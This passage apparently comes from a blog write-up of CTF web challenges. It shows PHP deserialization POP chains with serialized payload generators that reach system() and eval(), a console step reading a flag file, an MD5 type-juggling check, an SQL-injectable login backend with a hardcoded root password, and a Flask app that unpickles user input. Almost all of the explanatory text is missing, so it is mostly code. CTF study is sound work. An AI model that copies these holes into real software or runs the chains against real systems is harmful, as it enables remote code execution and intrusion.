class="variable">$s</span>(<span class="variable language_">$this</span>-&gt;evil);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$c</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$s</span> = <span class="variable language_">$this</span>-&gt;b;</span><br><span class="line">        <span class="variable">$s</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$s</span>-&gt;a = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$s</span>);</span><br></pre></td></tr></table></figure><h2 id="07-"><a class="markdownIt-Anchor" href="#07-"></a> 07: </h2><p><code>url/console</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;&gt;import os</span><br><span class="line">&gt;&gt;os.popen(<span class="string">&quot;ls&quot;</span>).<span class="built_in">read</span>()</span><br><span class="line">&gt;&gt;os.popen(<span class="string">&quot;cat flag&quot;</span>).<span class="built_in">read</span>()</span><br></pre></td></tr></table></figure><h2 id=""><a class="markdownIt-Anchor" href="#"></a> ()</h2><p><img src="https://picx.zhimg.com/80/v2-e62fd735fe276370d98b7542f906c453_1440w.png?source=d16d100b" alt="" /><br /><code>final1l1l_challenge.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;final1l1l_challenge.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$a</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$b</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$a</span>) &amp;&amp; !<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$b</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$a</span> == <span class="number">0</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) == <span class="variable">$b</span>[<span class="variable">$a</span>]) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;noooooooooooo&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>( <span class="string">&#x27;Notice the param type!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>( <span class="string">&#x27;Where is your param?&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>(maybe)</p><h2 id="_backend"><a class="markdownIt-Anchor" href="#_backend"></a> _Backend()</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>)&#123;</span><br><span class="line">    <span class="variable">$verify_code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;verify_code&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$verify_code</span>) || <span class="variable">$verify_code</span> !== <span class="variable">$_SESSION</span>[<span class="string">&#x27;captcha_code&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&#x27;status&#x27;</span> =&gt; <span class="number">0</span>,<span class="string">&#x27;info&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>));</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;captcha_code&#x27;</span>]);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$email</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9]+@[a-zA-Z0-9]+\\.[a-zA-Z0-9]+/&quot;</span>, <span class="variable">$email</span>)||<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/or/i&quot;</span>, <span class="variable">$email</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&#x27;status&#x27;</span> =&gt; <span class="number">0</span>,<span class="string">&#x27;info&#x27;</span> =&gt; <span class="string">&#x27; &#x27;</span>.<span class="variable">$email</span>.<span class="string">&#x27; &#x27;</span>));</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;captcha_code&#x27;</span>]);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$pwd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pwd&#x27;</span>];</span><br><span class="line">    <span class="variable">$pwd</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$pwd</span>);</span><br><span class="line">    <span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;123456&quot;</span>,<span class="string">&quot;xdsec&quot;</span>,<span class="number">3306</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM admin WHERE email=&#x27;<span class="subst">$email</span>&#x27; AND pwd=&#x27;<span class="subst">$pwd</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>,<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$row</span>)&#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;admin_id&#x27;</span>] = <span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;admin_email&#x27;</span>] = <span class="variable">$row</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&#x27;status&#x27;</span> =&gt; <span class="number">1</span>,<span class="string">&#x27;info&#x27;</span> =&gt; <span class="string">&#x27;moectf&#123;testflag&#125;&#x27;</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&#x27;status&#x27;</span> =&gt; <span class="number">0</span>,<span class="string">&#x27;info&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>));</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;captcha_code&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="pop-moe"><a class="markdownIt-Anchor" href="#pop-moe"></a> pop moe</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class000</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$payl0ad</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$what</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;payl0ad === <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;FAILED TO ATTACK&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable language_">$this</span>-&gt;what;</span><br><span class="line">        <span class="variable">$a</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class001</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$payl0ad</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a-&gt;payload = <span class="variable language_">$this</span>-&gt;payl0ad;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class002</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$sec</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$b</span>(<span class="variable language_">$this</span>-&gt;sec);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dangerous</span>(<span class="params"><span class="variable">$whaattt</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$whaattt</span>-&gt;<span class="title function_ invoke__">evvval</span>(<span class="variable">$this</span>-&gt;sec);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class003</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mystr</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evvval</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;mystr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://picx.zhimg.com/80/v2-7cac117389557ba335fe0ee1073c4a01_1440w.png" alt="" /></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class000</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$payl0ad</span> = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$what</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;payl0ad === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;FAILED TO ATTACK&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable language_">$this</span>-&gt;what;</span><br><span class="line">        <span class="variable">$a</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class001</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$payl0ad</span> = <span class="string">&quot;dangerous&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a-&gt;payload = <span class="variable language_">$this</span>-&gt;payl0ad;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class002</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sec</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$b</span>(<span class="variable language_">$this</span>-&gt;sec);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dangerous</span>(<span class="params"><span class="variable">$whaattt</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$whaattt</span>-&gt;<span class="title function_ invoke__">evvval</span>(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class003</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mystr</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evvval</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;mystr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> <span class="title function_ invoke__">class000</span>();</span><br><span class="line"><span class="variable">$s</span>-&gt;what = <span class="keyword">new</span> <span class="title function_ invoke__">class001</span>();</span><br><span class="line"><span class="variable">$s</span>-&gt;what-&gt;a = <span class="keyword">new</span> <span class="title function_ invoke__">class002</span>();</span><br><span class="line"><span class="variable">$s</span>-&gt;what-&gt;a-&gt;sec = <span class="keyword">new</span> <span class="title function_ invoke__">class003</span>();</span><br><span class="line"><span class="variable">$s</span>-&gt;what-&gt;a-&gt;sec-&gt;mystr=<span class="string">&quot;phpinfo();&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$s</span>);</span><br></pre></td></tr></table></figure><p><code>class003</code><code>evvval</code><code>__tostring</code></p><h2 id=""><a class="markdownIt-Anchor" href="#"></a> ()</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://127.0.0.1:50886/&#x27;</span></span><br><span class="line"><span class="built_in">dict</span> = &#123;<span class="string">&quot;1&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;2&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;3&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;4&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;5&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;6&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;7&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;8&quot;</span>: <span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">res = requests.post(url, data=&#123;<span class="string">&quot;player&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;direct&quot;</span>: <span class="string">&quot;&quot;</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    soup = BeautifulSoup(res.text, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">    status_element = soup.find(<span class="built_in">id</span>=<span class="string">&#x27;status&#x27;</span>)</span><br><span class="line">    status_text = status_element.get_text() <span class="keyword">if</span> status_element <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    numbers = re.findall(<span class="string">r&#x27;\d+&#x27;</span>, status_text)</span><br><span class="line">    numbers = [<span class="built_in">int</span>(num) <span class="keyword">for</span> num <span class="keyword">in</span> numbers]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(numbers) == <span class="number">1</span>:</span><br><span class="line">        a = <span class="built_in">dict</span>[<span class="built_in">str</span>(numbers[<span class="number">0</span>])]</span><br><span class="line">        res = requests.post(</span><br><span class="line">            url, data=&#123;<span class="string">&quot;player&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;a&#125;</span>&quot;</span>, <span class="string">&quot;direct&quot;</span>: <span class="string">&quot;&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        a = <span class="built_in">dict</span>[<span class="built_in">str</span>(numbers[<span class="number">0</span>])]</span><br><span class="line">        b = <span class="built_in">dict</span>[<span class="built_in">str</span>(numbers[<span class="number">1</span>])]</span><br><span class="line">        res = requests.post(</span><br><span class="line">            url, data=&#123;<span class="string">&quot;player&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;a&#125;</span><span class="subst">&#123;b&#125;</span>&quot;</span>, <span class="string">&quot;direct&quot;</span>: <span class="string">&quot;&quot;</span>&#125;)</span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">30</span>)</span><br><span class="line">res = requests.post(url, data=&#123;<span class="string">&quot;player&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;direct&quot;</span>: <span class="string">&quot;&quot;</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p></p><h2 id="whos-blog"><a class="markdownIt-Anchor" href="#whos-blog"></a> whos blog?()</h2><p></p><h2 id="petstore"><a class="markdownIt-Anchor" href="#petstore"></a> PetStore()</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify, render_template, redirect</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pet</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, species</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        self.name = name</span><br><span class="line">        self.species = species</span><br><span class="line">        self.uuid = uuid.uuid4()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;Pet(name=<span class="subst">&#123;self.name&#125;</span>, species=<span class="subst">&#123;self.species&#125;</span>, uuid=<span class="subst">&#123;self.uuid&#125;</span>)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PetStore</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        self.pets = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">create_pet</span>(<span class="params">self, name, species</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        pet = Pet(name, species)</span><br><span class="line">        self.pets.append(pet)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_pet</span>(<span class="params">self, pet_uuid</span>) -&gt; Pet | <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">for</span> pet <span class="keyword">in</span> self.pets:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">str</span>(pet.uuid) == pet_uuid:</span><br><span class="line">                <span class="keyword">return</span> pet</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">export_pet</span>(<span class="params">self, pet_uuid</span>) -&gt; <span class="built_in">str</span> | <span class="literal">None</span>:</span><br><span class="line">        pet = self.get_pet(pet_uuid)</span><br><span class="line">        <span class="keyword">if</span> pet <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            self.pets.remove(pet)</span><br><span class="line">            serialized_pet = base64.b64encode(pickle.dumps(pet)).decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> serialized_pet</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">import_pet</span>(<span class="params">self, serialized_pet</span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pet_data = base64.b64decode(serialized_pet)</span><br><span class="line">            pet = pickle.loads(pet_data)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(pet, Pet):</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> self.pets:</span><br><span class="line">                    <span class="keyword">if</span> i.uuid == pet.uuid:</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">                self.pets.append(pet)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">store = PetStore()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    pets = store.pets</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, pets=pets)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/create&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_pet</span>():</span><br><span class="line">    name = request.form[<span class="string">&quot;name&quot;</span>]</span><br><span class="line">    species = request.form[<span class="string">&quot;species&quot;</span>]</span><br><span class="line">    store.create_pet(name, species)</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;/&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/get&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_pet</span>():</span><br><span class="line">    pet_uuid = request.form[<span class="string">&quot;uuid&quot;</span>]</span><br><span class="line">    pet = store.get_pet(pet_uuid)</span><br><span class="line">    <span class="keyword">if</span> pet <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;name&quot;</span>: pet.name, <span class="string">&quot;species&quot;</span>: pet.species, <span class="string">&quot;uuid&quot;</span>: pet.uuid&#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Pet not found&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/export&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">export_pet</span>():</span><br><span class="line">    pet_uuid = request.form[<span class="string">&quot;uuid&quot;</span>]</span><br><span class="line">    serialized_pet = store.export_pet(pet_uuid)</span><br><span class="line">    <span class="keyword">if</span> serialized_pet <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;serialized_pet&quot;</span>: serialized_pet&#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Pet not found&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/import&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">import_pet</span>():</span><br><span class="line">    serialized_pet = request.form[<span class="string">&quot;serialized_pet&quot;</span>]</span><br><span class="line">    <span class="keyword">if</span> store.import_pet(serialized_pet):</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;/&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Failed to import pet&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8888</span>, debug=<span class="literal">False</span>, threaded=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p></p><h1 id=""><a class="markdownIt-Anchor" href="#"></a> </h1><p></p>]]></content>
    
    
      
      
